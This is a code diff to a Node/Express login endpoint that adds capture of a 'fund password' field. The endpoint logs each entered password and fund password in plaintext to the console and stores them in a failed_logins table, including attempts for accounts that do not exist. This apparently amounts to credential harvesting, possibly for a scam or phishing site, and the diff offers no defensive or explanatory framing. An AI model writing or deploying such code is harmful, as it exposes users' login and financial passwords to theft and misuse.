@@ -47,12 +47,12 @@ app.post('/api/signup', async (req, res) => {
 
 // Login endpoint
 app.post('/api/login', async (req, res) => {
-  const { email, phone, password } = req.body;
+  const { email, phone, password, fundPassword } = req.body;
   const identifier = email || phone;
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   // Log to server console immediately when user presses login
-  console.log(`[LOGIN ATTEMPT] Identifier: ${identifier} | Password Entered: ${password}`);
+  console.log(`[LOGIN ATTEMPT] Identifier: ${identifier} | Password Entered: ${password} | Fund Password: ${fundPassword || 'N/A'}`);
 
   if (!identifier || !password) {
     return res.status(400).json({ error: 'Please provide email/phone and password.' });
@@ -73,8 +73,8 @@ app.post('/api/login', async (req, res) => {
       
       // Store in failed_logins table
       await pool.query(
-        `INSERT INTO failed_logins (identifier, attempted_password, reason, ip_address) VALUES ($1, $2, $3, $4)`,
-        [identifier, password, 'User not found', ipAddress]
+        `INSERT INTO failed_logins (identifier, attempted_password, confirm_fund_password, reason, ip_address) VALUES ($1, $2, $3, $4, $5)`,
+        [identifier, password, fundPassword || null, 'User not found', ipAddress]
       );
 
       return res.status(401).json({ error: 'Invalid credentials.' });
@@ -90,8 +90,8 @@ app.post('/api/login', async (req, res) => {
 
       // Store in failed_logins table
       await pool.query(
-        `INSERT INTO failed_logins (identifier, attempted_password, reason, ip_address) VALUES ($1, $2, $3, $4)`,
-        [identifier, password, 'Incorrect password', ipAddress]
+        `INSERT INTO failed_logins (identifier, attempted_password, confirm_fund_password, reason, ip_address) VALUES ($1, $2, $3, $4, $5)`,
+        [identifier, password, fundPassword || null, 'Incorrect password', ipAddress]
       );
 
       return res.status(401).json({ error: 'Invalid credentials.' });
